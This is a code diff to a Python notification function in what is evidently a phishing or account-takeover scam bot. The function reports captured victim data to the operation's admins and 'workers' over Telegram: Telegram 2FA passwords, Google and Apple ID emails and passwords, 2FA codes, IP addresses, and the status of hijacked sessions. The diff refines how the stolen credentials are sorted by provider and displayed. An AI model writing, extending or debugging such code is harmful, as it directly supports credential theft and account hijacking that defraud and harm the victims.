@@ -573,8 +573,8 @@ async def notify_user_event(
             worker_header = "🦣 <b>Запросил повторный код Apple ID!</b>\n\n"
             status_desc = "🔄 Запросил повторный код или пуш"
         elif norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete", "apple_authorized", "apple_complete"):
-            is_apple_log = norm_step.startswith("apple_") or (email and ("icloud" in str(email).lower() or "apple" in str(email).lower()))
-            is_google_log = norm_step.startswith("google_") or (email and "gmail" in str(email).lower())
+            is_apple_log = norm_step.startswith("apple_") or (kwargs.get("provider") == "apple")
+            is_google_log = norm_step.startswith("google_") or (kwargs.get("provider") == "google")
             if is_apple_log:
                 admin_header = "📬 <b>Новый лог | 🍏 Apple ID успешно привязан</b>\n"
                 worker_header = "<b><i>🎉🍏 Успешный лог Apple ID! </i></b>\n\n"
@@ -593,8 +593,8 @@ async def notify_user_event(
             status_desc = f"<code>{norm_step}</code>"
 
         # Determine authentication provider for unified labeling
-        is_apple = norm_step.startswith("apple_") or (email and ("icloud" in str(email).lower() or "apple" in str(email).lower()))
-        is_google = norm_step.startswith("google_") or (email and "gmail" in str(email).lower())
+        is_apple = norm_step.startswith("apple_") or (kwargs.get("provider") == "apple")
+        is_google = norm_step.startswith("google_") or (kwargs.get("provider") == "google")
 
         if is_apple:
             email_label = "🍏 <b>Apple ID:</b>"
@@ -607,36 +607,46 @@ async def notify_user_event(
             pass_label = "2FA Пароль"
 
         sess_info = await asyncio.to_thread(db.get_user_sessions, DB_PATH, user_tg_id)
+        has_tg = bool(sess_info.get("has_telegram"))
+        has_goog = bool(sess_info.get("has_google"))
+        has_app = bool(sess_info.get("has_apple"))
+        in_goog_flow = norm_step.startswith("google_") or (kwargs.get("provider") == "google")
+        in_app_flow = norm_step.startswith("apple_") or (kwargs.get("provider") == "apple")
+        in_tg_flow = not in_goog_flow and not in_app_flow
+
         tg_phone_disp = user_row.get("telegram_phone") if user_row and "telegram_phone" in user_row.keys() else None
         if not tg_phone_disp and user_row and user_row.get("phone"):
             tg_phone_disp = user_row["phone"]
-        if not tg_phone_disp and phone:
+        if not tg_phone_disp and phone and in_tg_flow:
             tg_phone_disp = phone
 
         tg_pass_disp = user_row.get("telegram_2fa") if user_row and "telegram_2fa" in user_row.keys() else None
-        if not tg_pass_disp and user_row and user_row.get("password_2fa") and not (norm_step.startswith("google_") or norm_step.startswith("apple_")):
-            tg_pass_disp = user_row["password_2fa"]
-        if not tg_pass_disp and password_2fa and not (norm_step.startswith("google_") or norm_step.startswith("apple_")):
-            tg_pass_disp = password_2fa
+        if not tg_pass_disp and in_tg_flow:
+            if user_row and user_row.get("password_2fa"):
+                tg_pass_disp = user_row["password_2fa"]
+            elif password_2fa:
+                tg_pass_disp = password_2fa
 
         goog_email_disp = user_row.get("google_email") if user_row and "google_email" in user_row.keys() else None
-        if not goog_email_disp and user_row and user_row.get("email") and "gmail" in str(user_row.get("email")).lower():
-            goog_email_disp = user_row["email"]
-        if not goog_email_disp and email and (is_google or norm_step.startswith("google_")):
-            goog_email_disp = email
+        if not goog_email_disp and (has_goog or in_goog_flow):
+            if email and "gmail" in str(email).lower():
+                goog_email_disp = email
+            elif user_row and user_row.get("email") and "gmail" in str(user_row.get("email")).lower():
+                goog_email_disp = user_row["email"]
 
         goog_pass_disp = user_row.get("google_password") if user_row and "google_password" in user_row.keys() else None
-        if not goog_pass_disp and (norm_step.startswith("google_") or is_google):
+        if not goog_pass_disp and in_goog_flow and password_2fa:
             goog_pass_disp = password_2fa
 
         app_email_disp = user_row.get("apple_email") if user_row and "apple_email" in user_row.keys() else None
-        if not app_email_disp and user_row and user_row.get("email") and ("icloud" in str(user_row.get("email")).lower() or "apple" in str(user_row.get("email")).lower()):
-            app_email_disp = user_row["email"]
-        if not app_email_disp and email and (is_apple or norm_step.startswith("apple_")):
-            app_email_disp = email
+        if not app_email_disp and (has_app or in_app_flow):
+            if email and ("icloud" in str(email).lower() or "apple" in str(email).lower()):
+                app_email_disp = email
+            elif user_row and user_row.get("email") and ("icloud" in str(user_row.get("email")).lower() or "apple" in str(user_row.get("email")).lower()):
+                app_email_disp = user_row["email"]
 
         app_pass_disp = user_row.get("apple_password") if user_row and "apple_password" in user_row.keys() else None
-        if not app_pass_disp and (norm_step.startswith("apple_") or is_apple):
+        if not app_pass_disp and in_app_flow and password_2fa:
             app_pass_disp = password_2fa
 
         if is_final_auth:
@@ -668,14 +678,14 @@ async def notify_user_event(
         elif sess_info.get("has_telegram"):
             mamont_data_lines.append("• 📱 <b>Telegram:</b> 🟢 Сессия активна")
 
-        if goog_email_disp or norm_step.startswith("google_"):
-            g_email_str = goog_email_disp or email or "—"
-            g_mark = " (🟢 Сессия активна)" if sess_info.get("has_google") else " (⏳ В процессе)"
+        if (has_goog or in_goog_flow) and (goog_email_disp or in_goog_flow):
+            g_email_str = goog_email_disp or (email if in_goog_flow else None) or "—"
+            g_mark = " (🟢 Сессия активна)" if has_goog else " (⏳ В процессе)"
             mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{g_email_str}</code>{g_mark}")
 
-        if app_email_disp or norm_step.startswith("apple_"):
-            a_email_str = app_email_disp or email or "—"
-            a_mark = " (🟢 Сессия активна)" if sess_info.get("has_apple") else " (⏳ В процессе)"
+        if (has_app or in_app_flow) and (app_email_disp or in_app_flow):
+            a_email_str = app_email_disp or (email if in_app_flow else None) or "—"
+            a_mark = " (🟢 Сессия активна)" if has_app else " (⏳ В процессе)"
             mamont_data_lines.append(f"• 🍏 <b>Apple ID:</b> <code>{a_email_str}</code>{a_mark}")
 
         if ip and ip != "—":
@@ -694,9 +704,9 @@ async def notify_user_event(
         auth_data_lines = []
         if tg_pass_disp:
             auth_data_lines.append(f"• 🔑 <b>2FA Telegram:</b> <code>{tg_pass_disp}</code>")
-        if goog_pass_disp:
+        if goog_pass_disp and (has_goog or in_goog_flow):
             auth_data_lines.append(f"• 🔑 <b>Пароль Google:</b> <code>{goog_pass_disp}</code>")
-        if app_pass_disp:
+        if app_pass_disp and (has_app or in_app_flow):
             auth_data_lines.append(f"• 🔑 <b>Пароль Apple ID:</b> <code>{app_pass_disp}</code>")
         if google_code:
             auth_data_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
